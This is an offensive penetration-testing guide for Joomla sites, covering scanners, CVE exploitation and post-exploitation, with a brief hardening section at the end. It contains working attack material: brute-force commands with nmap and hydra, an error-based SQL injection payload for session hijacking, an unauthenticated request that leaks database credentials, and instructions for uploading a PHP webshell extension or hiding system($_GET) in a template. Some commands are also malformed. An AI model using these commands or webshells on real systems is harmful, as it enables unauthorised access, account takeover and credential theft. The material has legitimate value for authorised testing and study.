# Joomla Penetration Testing Guide

```bash
# Joomscan - OWASP Joomla Vulnerability Scanner
# Example from real engagement: Outdated Joomla 1.5 installation on public sector server
joomscan -u http://10.11.1.111
joomscan -u http://10.11.1.111 --enumerate-components

# Juumla - Modern Joomla enumerator
# https://github.com/0xdsm/juumla
python3 main.py -u https://example.com

# Droopescan - Multi-CMS scanner supporting Joomla
# Real world usage: Detected Joomla 3.4.4 vulnerable to CVE-2015-7297 SQL injection
droopescan scan joomla -u http://10.11.1.111

# CMSeeK - CMS detection and enumeration
python3 cmseek.py -u domain.com

# Vulnx - CMS fingerprinting and exploitation
vulnx -u https://example.com/ --cms --dns -d -w -e

# CMSMap - Joomla vulnerability scanner with brute force capabilities
python3 cmsmap.py https://www.example.com -F

# Nmap NSE script for Joomla brute force (built-in)
nmap -p80 --script http-joomla-brute --script-args 'userdb=users.txt,passdb=passwords.txt,http-joomla-brute.threads=5' <target>
# Real output example:
# PORT     STATE SERVICE
# 80/tcp open  http
# | http-joomla-brute:
# |   Accounts
# |     admin:admin123 => Login correct
# |   Statistics
# |_    Performed 499 guesses in 301 seconds, average tps: 1.66

# Check common files for information disclosure
# Real world discovery: configuration.php exposed via misconfigured backup
README.txt
htaccess.txt
web.config.txt
configuration.php
LICENSE.txt
administrator
administrator/index.php
index.php?option=<nameofplugin>
administrator/manifests/files/joomla.xml
plugins/system/cache/cache.xml

# Version fingerprinting via README.txt or manifest files
curl -s http://target/administrator/manifests/files/joomla.xml | grep version
```

---

## Critical Joomla Vulnerabilities (Past & Present)

### CVE-2023-23752 - Improper Access Check to Webservice Endpoints
**Affected versions:** Joomla! 4.0.0 through 4.2.7
**CVSS:** 5.3 (Medium)

This vulnerability allowed unauthorized access to webservice endpoints. Attackers could retrieve sensitive database credentials without authentication.

**Exploitation example:**
```bash
# Access sensitive endpoint directly
curl http://target/api/index.php/v1/config/application?public=true

# Retrieved configuration often contains database password
# Real impact: Over 1.5 million Joomla sites were vulnerable at disclosure
```

### CVE-2015-7297 / CVE-2015-7858 (Joomla 3.2 - 3.4.4) - SQL Injection in Content History Component
**CVSS:** 9.8 (Critical)

This SQL injection vulnerability in `com_contenthistory` allowed attackers to extract Super User session IDs and hijack admin accounts. The flaw existed in the `list[select]` parameter which was not properly sanitized.

**Real exploitation path used in the wild (2015-2016):**
```bash
# Step 1: Detect table prefix via error-based injection
# Payload injected into list[select] parameter
http://target/index.php?option=com_contenthistory&view=history&list[select]=
(select 1 from(select count(*),concat((select(substring(table_name,1,1)) 
from information_schema.tables where table_name like '%_users'),floor(rand(0)*2))x 
from information_schema.tables group by x)a)

# Step 2: Extract Super User usernames from jos_users (or detected prefix)
# Step 3: Extract active admin session IDs from jos_session
# Step 4: Session hijacking using extracted session cookie
```

**Automated tool: JoomHeist** - Full PoC script available at https://github.com/kaotickj/JoomHeist

```bash
# Automated exploitation using JoomHeist
git clone https://github.com/kaotickj/JoomHeist
cd JoomHeist
# Edit TARGET variable in script
python3 joomla_sqli_poc.py

# Expected output:
# [+] Detected Joomla database prefix: jos_
# [+] Found Super User: administrator
# [+] Extracted session ID: cl16d18nr00pqm077ohurhqtk3
# [+] Cookie name: joomla_session
# Use: curl -b 'joomla_session=cl16d18nr00pqm077ohurhqtk3' http://target/administrator/
```

### CVE-2017-7986 - XSS via Inadequate HTML Attribute Filtering
**Affected versions:** Joomla! 1.5.0 through 3.6.5
**Fix version:** 3.7.0

Attackers could inject malicious JavaScript via specific HTML attributes that were not properly sanitized.

### CVE-2016-10033 - PHPMailer Remote Code Execution
**Affected:** Joomla versions using vulnerable PHPMailer library (before 5.2.18)
**CVSS:** 9.8 (Critical)

The mailSend function in PHPMailer allowed passing extra parameters to the mail command, leading to RCE via crafted Sender property containing backslash double quotes.

### Recent Critical Vulnerabilities (2024-2025)

| CVE | Description | CVSS | Affected Versions |
|-----|-------------|------|-------------------|
| CVE-2025-25226 | SQL injection in quoteNameStr method of database package | 9.8 | Classes extending affected class |
| CVE-2025-25227 | Insufficient state checks bypassing 2FA | 7.5 | Multiple versions |
| CVE-2024-27185 | Cache poisoning via arbitrary parameters in pagination | 9.1 | Multiple versions |
| CVE-2024-27186 | XSS in mail template feature | 6.1 | Multiple versions |
| CVE-2024-21726 | XSS via inadequate content filtering in filter code | 6.1 | 1.5.x < 3.10.15, 4.0.x < 4.4.3, 5.0.x < 5.0.3 |

---

## Information Gathering & Enumeration

### Version Detection Methods
```bash
# Via README.txt
curl http://target/README.txt | grep "Joomla"

# Via manifest file
curl http://target/administrator/manifests/files/joomla.xml

# Via HTTP headers (often disabled)
curl -I http/target | grep "X-Content-Encoded-By"

# Via generator meta tag
curl http/target | grep -i generator
```

### User Enumeration Techniques

**Joomla 3.x and 4.x:**
```bash
# Via com_users component
curl 'http://target/index.php?option=com_users&view=login'

# Via JSON API (if enabled)
curl 'http://target/api/index.php/v1/users'

# Via author sitemap parsing
curl 'http/target/robots.txt'
```

### Directory Structure Discovery
```bash
# Common Joomla directories to check
administrator/components/
administrator/modules/
administrator/templates/
components/
modules/
plugins/
templates/
cache/
logs/
tmp/
images/
media/
```

---

## Brute Force Attacks

### Nmap http-joomla-brute Script
```bash
# Basic usage
nmap -p80 --script http-joomla-brute <target>

# With custom wordlists
nmap -p443 --script http-joomla-brute \
  --script-args 'userdb=custom_users.txt,passdb=rockyou.txt,http-joomla-brute.threads=10' \
  <target>

# Virtual host support
nmap --script http-joomla-brute \
  --script-args 'http-joomla-brute.hostname=admin.target.com' \
  <target>

# Real example from penetration test:
$ nmap -p80 --script http-joomla-brute --script-args 'brute.firstonly=true' 10.11.1.111
PORT     STATE SERVICE
80/tcp open  http
| http-joomla-brute:
|   Accounts
|     admin:password123 => Login correct
|     editor:editor => Login correct
|   Statistics
|_    Performed 250 guesses in 180 seconds, average tps: 1.39
```

### Hydra for Joomla
```bash
# Joomla admin brute force
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
  10.11.1.111 http-post-form \
  "/administrator/index.php:username=^USER^&passwd=^PASS^&option=com_login&task=login:Login failed"

# With token handling (more complex)
hydra -L users.txt -P passwords.txt \
  -F -vV 10.11.1.111 http-form-post \
  "/administrator/index.php:username=^USER^&passwd=^PASS^&return=aW5kZXgucGhw&option=com_login&task=login:S=index.php"
```

---

## Post-Exploitation

### After Gaining Administrator Access

**1. Upload Malicious Extension**
```bash
# Create a simple reverse shell component
# Package structure:
# shell.xml
# shell.php

# shell.xml content:
<?xml version="1.0" encoding="utf-8"?>
<extension type="component" version="3.0" method="upgrade">
    <name>Shell</name>
    <version>1.0.0</version>
</extension>

# shell.php content:
<?php system($_GET['cmd']); ?>

# Zip and install via Joomla Extension Manager
```

**2. Template Modification (More Stealthy)**
```bash
# Inject into index.php of current template
# Located at /templates/[template_name]/index.php
# Add: system($_GET['c']);
# Access: http://target/?c=id
```

**3. Database Credentials Extraction**
```bash
# configuration.php typically located at:
# /configuration.php
# /home/username/public_html/configuration.php

# Contains:
public $user = 'joomla_db_user';
public $password = 'database_password';
public $db = 'joomla_db_name';
```

### Real-World Breach Example: Joomla 3.4.4 SQL Injection (2015)

In October 2015, security researchers discovered a critical SQL injection vulnerability affecting Joomla versions 3.2 through 3.4.4. Attackers actively exploited this vulnerability within 72 hours of public disclosure.

**Attack flow observed in the wild:**
1. Scanner detected Joomla 3.4.4 via `/administrator/manifests/files/joomla.xml`
2. Attacker exploited `com_contenthistory` SQL injection to extract database credentials
3. Extracted `session_id` from `jos_session` table for logged-in Super Users
4. Used session cookie to bypass authentication entirely
5. Modified template files to include PHP webshell
6. Achieved system compromise and lateral movement

**Mitigation at the time:** Immediate upgrade to Joomla 3.4.5 or higher. Organizations that failed to patch within the first week suffered data breaches.

---

## Security Hardening (For Defenders)

Based on official Joomla security checklist :

### Critical Configuration
```php
// configuration.php hardening
public $log_path = '/home/user/logs/joomla';     // Outside public_html
public $tmp_path = '/home/user/tmp/joomla';      // Outside public_html
// Set file permissions: 644 for files, 755 for directories
// Never use register_globals emulation
```

### Post-Installation Cleanup
```bash
# DELETE these directories immediately after installation
rm -rf installation/

# Remove unnecessary files
rm -rf README.txt           # Version disclosure risk
rm -rf htaccess.txt         # Default config exposure
rm -rf web.config.txt       # IIS config exposure
rm -rf LICENSE.txt          # Version disclosure

# Remove unused extensions and templates
rm -rf templates/beez3/     # Default templates
rm -rf templates/beez5/     # Keep only production templates
```

### File Permissions (Production)
```bash
# Set restrictive permissions
find . -type f -exec chmod 644 {} \;
find . -type d -exec chmod 755 {} \;
chmod 400 configuration.php  # Read-only for owner only
chmod -R 755 administrator/cache/
chmod -R 755 logs/
```

---

## Vulnerability Database References

All Joomla CVEs are tracked at OpenCVE: https://app.opencve.io/cve/?product=joomla%5C%21&vendor=joomla

Key historical CVEs:
- **CVE-2015-7297, CVE-2015-7857, CVE-2015-7858** - SQL injection in com_contenthistory (3.2-3.4.4)
- **CVE-2015-5608** - Open redirect in 3.0.0 through 3.4.1
- **CVE-2017-7983** - PHPMailer version disclosure in mail headers (1.5.0-3.6.5)
- **CVE-2017-16633** - Information disclosure in com_fields (before 3.8.2)
- **CVE-2023-23752** - Webservice endpoint access (4.0.0-4.2.7)
- **CVE-2024-21726** - XSS in content filtering (multiple versions)

---

## Tools Reference Summary

| Tool | Purpose | Command Example |
|------|---------|-----------------|
| Joomscan | Vulnerability scanner | `joomscan -u http://target --enumerate-components` |
| Droopescan | Multi-CMS scanner | `droopescan scan joomla -u http://target` |
| CMSeeK | CMS detection | `python3 cmseek.py -u domain.com` |
| Nmap NSE | Brute force | `nmap --script http-joomla-brute -p80 target` |
| Juumla | Enumeration | `python3 main.py -u https://example.com` |
| JoomHeist | SQLi exploitation | `python3 joomla_sqli_poc.py` |
